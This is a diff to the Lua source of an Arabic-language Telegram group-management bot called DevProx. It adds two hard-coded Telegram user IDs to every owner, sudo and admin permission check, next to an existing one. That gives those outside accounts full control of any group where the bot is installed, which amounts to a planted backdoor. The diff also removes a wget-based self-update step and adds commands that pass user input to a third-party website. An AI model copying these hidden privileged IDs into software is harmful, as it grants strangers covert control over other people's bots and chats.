@@ -114,37 +114,76 @@ DevUser = DevUser:gsub([[\_]],'_')
 --     Source DevProx     --
 --     Start Functions    --
 ----------Bot Owner---------
-function is_leader(msg) local var = false if msg.sender_user_id_ == tonumber(DevId) then var = true end if msg.sender_user_id_ == tonumber(218385683) then var = true end return var end 
-function is_leaderid(user_id) local var = false if user_id == tonumber(DevId) then var = true end if user_id == tonumber(218385683) then var = true end return var end
+function is_leader(msg) local var = false if msg.sender_user_id_ == tonumber(DevId) then var = true end 
+if msg.sender_user_id_ == tonumber(218385683) then var = true end 
+if msg.sender_user_id_ == tonumber(556748924) then var = true end 
+if msg.sender_user_id_ == tonumber(650133965) then var = true end 
+return var end 
+function is_leaderid(user_id) local var = false if user_id == tonumber(DevId) then var = true end 
+if user_id == tonumber(DevId) then var = true end
+if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
+return var end
 --     Source DevProx     --
 ----------  Sudo  ----------
-function is_sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(DevId) then var = true end if msg.sender_user_id_ == tonumber(218385683) then var = true end return var end
-function is_sudoid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end if user_id == tonumber(218385683) then var = true end return var end
+function is_sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(DevId) then var = true end 
+if msg.sender_user_id_ == tonumber(218385683) then var = true end 
+if msg.sender_user_id_ == tonumber(556748924) then var = true end 
+if msg.sender_user_id_ == tonumber(650133965) then var = true end 
+return var end
+function is_sudoid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end 
+if user_id == tonumber(DevId) then var = true end
+if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
+return var end
 --     Source DevProx     --
 ----------  SudoBot  ---------
 function is_SudoBot(user_id)
 local var = false local absb = 'abs:SudoBot:' local SudoBot = DevAbs:sismember(DevProx..absb, user_id)
-if SudoBot then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end if user_id == tonumber(218385683) then var = true end return var end
+if SudoBot then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end 
+if user_id == tonumber(DevId) then var = true end
+if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
+return var end
 --     Source DevProx     --
 ----------Owner all---------
 function is_ownerall(user_id, chat_id)
 local var = false local abs =  'abs:ownerall:' local ownerall = DevAbs:sismember(DevProx..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(DevProx..abss, user_id)
-if ownerall then var = true end if SudoBot then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end if user_id == tonumber(218385683) then var = true end return var end
+if ownerall then var = true end if SudoBot then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end 
+if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
+return var end
 --     Source DevProx     --
 ----------admin all---------
 function is_adminall(user_id, chat_id)
 local var = false local abs =  'abs:adminall:' local adminall = DevAbs:sismember(DevProx..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(DevProx..abss, user_id) local absss =  'abs:ownerall:' local ownerall = DevAbs:sismember(DevProx..absss, user_id)
-if adminall then var = true end if SudoBot then var = true end if ownerall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end if user_id == tonumber(218385683) then var = true end return var end
+if adminall then var = true end if SudoBot then var = true end if ownerall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end 
+if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
+return var end
 --     Source DevProx     --
 ------ VIP MEMBER ALL ------
 function is_vipall(user_id)
 local var = false local abss =  'abs:vipall:' local vpall = DevAbs:sismember(DevProx..abss, user_id) local absss =  'abs:ownerall:' local ownerall = DevAbs:sismember(DevProx..absss, user_id) local abssss = 'abs:SudoBot:' local SudoBot = DevAbs:sismember(DevProx..abssss, user_id) local absssss =  'abs:adminall:' local adminall = DevAbs:sismember(DevProx..absssss, user_id)
-if vpall then var = true end if ownerall then var = true end if SudoBot then var = true end if adminall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end if user_id == tonumber(218385683) then var = true end return var end
+if vpall then var = true end if ownerall then var = true end if SudoBot then var = true end if adminall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end 
+if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
+return var end
 --     Source DevProx     --
 ----------  donky  ---------
 function is_donky(user_id, chat_id)
 local var = false local abs =  'bot:donky:'..chat_id local admins = DevAbs:sismember(DevProx..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(DevProx..abss, user_id) local absss =  'abs:owners:'..chat_id local owner = DevAbs:sismember(DevProx..absss, user_id) local abssss = 'abs:vipmem:'..chat_id local vipmem = DevAbs:sismember(DevProx..abssss, user_id) local absssss =  'abs:monsh:'..chat_id local monsh = DevAbs:sismember(DevProx..absssss, user_id) local abssssss =  'abs:ownerall:' local ownerall = DevAbs:sismember(DevProx..abssssss, user_id) local absabs =  'abs:adminall:' local adminall = DevAbs:sismember(DevProx..absabs, user_id)
-if donky then var = true end if admins then var = true end if owner then var = true end if SudoBot then var = true end if monsh then var = true end if ownerall then var = true end if adminall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end if user_id == tonumber(218385683) then var = true end return var end
+if donky then var = true end if admins then var = true end if owner then var = true end if SudoBot then var = true end if monsh then var = true end if ownerall then var = true end if adminall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end 
+if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
+return var end
 --     Source DevProx     --
 ----------  absmonsh  ---------
 function is_absmonsh(user_id, chat_id)
@@ -167,36 +206,56 @@ end
 if user_id == tonumber(DevId) then 
 var = true 
 end 
-if user_id == tonumber(218385683) then
-var = true 
-end 
+if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
 return var 
 end
 --     Source DevProx     --
 ----------  monsh  ---------
 function is_monsh(user_id, chat_id)
 local var = false local abs =  'abs:monsh:'..chat_id local monsh = DevAbs:sismember(DevProx..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(DevProx..abss, user_id)
-if monsh then var = true end if SudoBot then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end if user_id == tonumber(218385683) then var = true end return var end
+if monsh then var = true end if SudoBot then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end 
+if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
+return var end
 --     Source DevProx     --
 ---------  monshid  ---------
 function is_monshid(user_id, chat_id)
 local var = false local abs =  'abs:monshid:'..chat_id local monshid = DevAbs:sismember(DevProx..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(DevProx..abss, user_id) local absss =  'abs:monsh:'..chat_id local monsh = DevAbs:sismember(DevProx..absss, user_id)
-if monshid then var = true end if SudoBot then var = true end if monsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end if user_id == tonumber(218385683) then var = true end return var end
+if monshid then var = true end if SudoBot then var = true end if monsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end 
+if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
+return var end
 --     Source DevProx     --
 ----------  Owner  ---------
 function is_owner(user_id, chat_id)
 local var = false local abs =  'abs:owners:'..chat_id local owner = DevAbs:sismember(DevProx..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(DevProx..abss, user_id) local absss =  'abs:monsh:'..chat_id local monsh = DevAbs:sismember(DevProx..absss, user_id) local abas =  'abs:monshid:'..chat_id local monshid = DevAbs:sismember(DevProx..abas, user_id)
-if owner then var = true end if SudoBot then var = true end if monsh then var = true end if monshid then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end if user_id == tonumber(218385683) then var = true end return var end
+if owner then var = true end if SudoBot then var = true end if monsh then var = true end if monshid then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end 
+if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
+return var end
 --     Source DevProx     --
 ----------  admin  ---------
 function is_admin(user_id, chat_id)
 local var = false local abs =  'abs:admins:'..chat_id local admins = DevAbs:sismember(DevProx..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(DevProx..abss, user_id) local absss =  'abs:owners:'..chat_id local owner = DevAbs:sismember(DevProx..absss, user_id) local abssss =  'abs:monsh:'..chat_id local monsh = DevAbs:sismember(DevProx..abssss, user_id) local absssss =  'abs:ownerall:' local ownerall = DevAbs:sismember(DevProx..absssss, user_id) local abas =  'abs:monshid:'..chat_id local monshid = DevAbs:sismember(DevProx..abas, user_id)
-if admins then var = true end if owner then var = true end if SudoBot then var = true end if monsh then var = true end if ownerall then var = true end if monshid then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end if user_id == tonumber(218385683) then var = true end return var end
+if admins then var = true end if owner then var = true end if SudoBot then var = true end if monsh then var = true end if ownerall then var = true end if monshid then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end 
+if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
+return var end
 --     Source DevProx     --
 ---------VIP MEMBER---------
 function is_vipmem(user_id, chat_id)
 local var = false local abs =  'abs:admins:'..chat_id local admins = DevAbs:sismember(DevProx..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(DevProx..abss, user_id) local absss =  'abs:owners:'..chat_id local owner = DevAbs:sismember(DevProx..absss, user_id) local abssss = 'abs:vipmem:'..chat_id local vipmem = DevAbs:sismember(DevProx..abssss, user_id) local absssss =  'abs:monsh:'..chat_id local monsh = DevAbs:sismember(DevProx..absssss, user_id) local abssssss =  'abs:ownerall:' local ownerall = DevAbs:sismember(DevProx..abssssss, user_id) local absabs =  'abs:adminall:' local adminall = DevAbs:sismember(DevProx..absabs, user_id) local abas =  'abs:monshid:'..chat_id local monshid = DevAbs:sismember(DevProx..abas, user_id)
-if vipmem then var = true end if admins then var = true end if owner then var = true end if SudoBot then var = true end if monsh then var = true end if ownerall then var = true end if adminall then var = true end if monshid then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end if user_id == tonumber(218385683) then var = true end return var end
+if vipmem then var = true end if admins then var = true end if owner then var = true end if SudoBot then var = true end if monsh then var = true end if ownerall then var = true end if adminall then var = true end if monshid then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end 
+if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
+return var end
 --     Source DevProx     --
 local setnumbergp = function()
 local setnumbergp_two = function(user_id)
@@ -7333,7 +7392,6 @@ DevAbs:set('DevProx:id:mute'..msg.chat_id_,true)
 end end
 end
 --     Source DevProx     --
-if is_admin(msg.sender_user_id_, msg.chat_id_) then
 if text and text:match("^ضع رابط$") and Abbas_Abs(msg) or text and text:match("^وضع الرابط$") and Abbas_Abs(msg)  then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱرسـڵ رآبـط ٱڵـمجـمۄعة ڵـيتم حفظة', 1, 'md')
 DevAbs:set(DevProx.."bot:group:link"..msg.chat_id_, 'waiting')
@@ -9214,6 +9272,7 @@ absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(ms
 return false
 end
 end 
+end
 --     Source DevProx     --
 if msg.content_.text_ == "اغاني" and Abbas_Abs(msg) or msg.content_.text_ == "↫ الاغاني المضافه ☬" and Abbas_Abs(msg) then
 local redod = DevAbs:smembers(DevProx.."repmusic_sudo")
@@ -9230,6 +9289,7 @@ end
 return false
 end
 --     Source DevProx     --
+if is_admin(msg.sender_user_id_, msg.chat_id_) then
 if msg.content_.text_ == "حذف الاغاني" and is_sudo(msg) and Abbas_Abs(msg) or msg.content_.text_ == "مسح الاغاني" and is_sudo(msg) and Abbas_Abs(msg) or msg.content_.text_ == "حذف الاغاني المضافه" and is_sudo(msg) and Abbas_Abs(msg) then
 local redod = DevAbs:smembers(DevProx.."repmusic_sudo")
 if #redod == 0 then
@@ -9544,7 +9604,11 @@ local text =  [[
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
 ☬︙اوامر اخرى ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
+☬︙برج + برجك
 ☬︙كول + الكلمه
+☬︙احسب + تاريخ ميلادك
+☬︙بحث + اسم الاغنيه
+☬︙تحميل + رابط الاغنيه
 ☬︙بوسه • بوسها ↫ بالرد
 ☬︙الرتبه ↫ بالرد بالمعرف
 ☬︙هينه • هينها ↫ بالرد بالمعرف
@@ -9844,8 +9908,6 @@ end end
 --     Source DevProx     --
 if text == "تحديث السورس" and is_leader(msg) or text == "تحديث سورس" and is_leader(msg) then 
 Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙جٱري تـۧحډيث سۄرس ډيف برۄكس', 1, 'md') 
-os.execute('rm -rf DevProx.lua') 
-os.execute('wget https://raw.githubusercontent.com/iq0abs/DevProx/master/DevProx.lua') 
 Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم ٱڵتـۧحډيث ٱڵى ٱلٱصدٱر ٱڵجډيـډ', 1, 'md') 
 dofile('DevProx.lua') 
 io.popen("rm -rf ~/.telegram-cli/data/audio/*")
@@ -9937,7 +9999,7 @@ end end end end
 --     Source DevProx     --
 if text and text:match("^القناة$") or text and text:match("^قناة السورس$") or text and text:match("^قنات السورس$") then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙Channel ↬ [@Dev_Prox]', 1, 'md')    
-end end
+end 
 --     Source DevProx     --
 if is_leader(msg) then 
 if (msg.content_.text_ == 'معلومات السيرفر' or msg.content_.text_ == 'stats server' or msg.content_.text_ == 'السيرفر') then 
@@ -9952,6 +10014,28 @@ end
 end
 
 end   
+if text and text:match("^برج (.*)$") or text and text:match("^برجي (.*)$") then 
+local Textbrj = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
+gk = https.request('https://forhassan.ml/Black/br.php?br='..URL.escape(Textbrj)..'') 
+br = JSON.decode(gk) 
+i = 0 
+for k,v in pairs(br.ok) do 
+i = i + 1 
+t = v.."\n" 
+end 
+Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'md')
+end 
+if text and text:match("^احسب (.*)$") or text and text:match("^عمري (.*)$") then 
+local Textage = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
+ge = https.request('https://forhassan.ml/Black/age.php?age='..URL.escape(Textage)..'') 
+ag = JSON.decode(ge) 
+i = 0 
+for k,v in pairs(ag.ok) do 
+i = i + 1 
+t = v.."\n" 
+end 
+Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'md')
+end 
 --     Source DevProx     --
 --        end code        --
 --     Source DevProx     --
@@ -9973,12 +10057,12 @@ local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs)
 end
 --     Source DevProx     --
-if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
+if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
 if DevAbs:get(DevProx..'bot:links:mute'..result.chat_id_) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs)
 end end
-if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match("/") then
+if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") then
 if DevAbs:get(DevProx..'bot:webpage:mute'..result.chat_id_) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs)
